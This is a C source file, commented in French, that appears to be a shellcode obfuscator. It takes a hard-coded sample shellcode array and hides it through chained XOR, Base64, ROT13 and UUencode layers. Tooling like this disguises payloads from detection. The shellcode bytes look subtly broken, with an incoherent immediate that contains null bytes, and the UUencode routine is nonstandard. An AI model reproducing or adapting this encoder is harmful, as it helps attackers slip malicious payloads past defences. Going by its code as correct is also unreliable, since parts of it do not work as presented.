/*  compilation : gcc -Wall -Wextra -o encode encode.c -lcrypto */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>

#define XOR_KEY "maClé"
#define XOR_KEY_LEN (sizeof(XOR_KEY) - 1)

/* ---------- XOR ---------- */
void xor_encode(unsigned char *data, size_t len,
                const unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < len; ++i)
        data[i] ^= key[i % key_len];
}

/* ---------- Base64 ---------- */
char *base64_encode(const unsigned char *in, size_t in_len,
                    size_t *out_len) {
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *mem = BIO_new(BIO_s_mem());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);   /* pas de sauts de ligne */
    b64 = BIO_push(b64, mem);
    BIO_write(b64, in, (int)in_len);
    BIO_flush(b64);

    char *buf;
    long buf_len = BIO_get_mem_data(mem, &buf);
    char *out = malloc(buf_len + 1);
    memcpy(out, buf, buf_len);
    out[buf_len] = '\0';
    *out_len = (size_t)buf_len;

    BIO_free_all(b64);
    return out;
}

/* ---------- ROT13 ---------- */
void rot13_encode(char *s) {
    for (; *s; ++s) {
        if ('a' <= *s && *s <= 'z')
            *s = 'a' + ((*s - 'a' + 13) % 26);
        else if ('A' <= *s && *s <= 'Z')
            *s = 'A' + ((*s - 'A' + 13) % 26);
    }
}

/* ---------- UUencode (simple) ---------- */
char *uuencode(const char *in) {
    size_t in_len = strlen(in);
    size_t out_len = ((in_len + 2) / 3) * 4 + 2;   /* "M" + données + '\0' */
    char *out = malloc(out_len);
    char *p = out;
    *p++ = 'M';                                   /* marqueur de début */

    for (size_t i = 0; i < in_len; i += 3) {
        unsigned int val = 0;
        int chunk = 0;
        for (int j = 0; j < 3; ++j) {
            val <<= 8;
            if (i + j < in_len) {
                val |= (unsigned char)in[i + j];
                ++chunk;
            }
        }
        for (int j = 0; j < 4; ++j) {
            if (j < ((chunk * 8 + 5) / 6))
                *p++ = ((val >> (6 * (3 - j))) & 0x3F) + ' ';
            else
                *p++ = '`';
        }
    }
    *p = '\0';
    return out;
}

/* ---------- Affichage hexadécimal ---------- */
void print_hex(const unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; ++i)
        printf("\\x%02x", buf[i]);
    putchar('\n');
}

/* ---------- Programme principal ---------- */
int main(void) {
    /* shellcode d’exemple */
    unsigned char shellcode[] = {
        0x31,0xc0,0x48,0xbb,0xd1,0x9a,0xe8,0x46,
        0x0c,0x00,0x00,0x53,0x54,0x5f,0x52,0x57,
        0x59,0x41,0x50,0x0f,0x05
    };
    size_t sc_len = sizeof(shellcode);

    printf("Shellcode original (%zu octets) : ", sc_len);
    print_hex(shellcode, sc_len);

    /* 1️⃣ XOR */
    xor_encode(shellcode, sc_len,
               (const unsigned char *)XOR_KEY, XOR_KEY_LEN);

    /* 2️⃣ Base64 */
    size_t b64_len;
    char *b64 = base64_encode(shellcode, sc_len, &b64_len);

    /* 3️⃣ ROT13 */
    rot13_encode(b64);

    /* 4️⃣ UUencode */
    char *uu = uuencode(b64);

    printf("\nReprésentation encodée :\n%s\n", uu);

    /* libération de la mémoire */
    free(b64);
    free(uu);
    return 0;
}
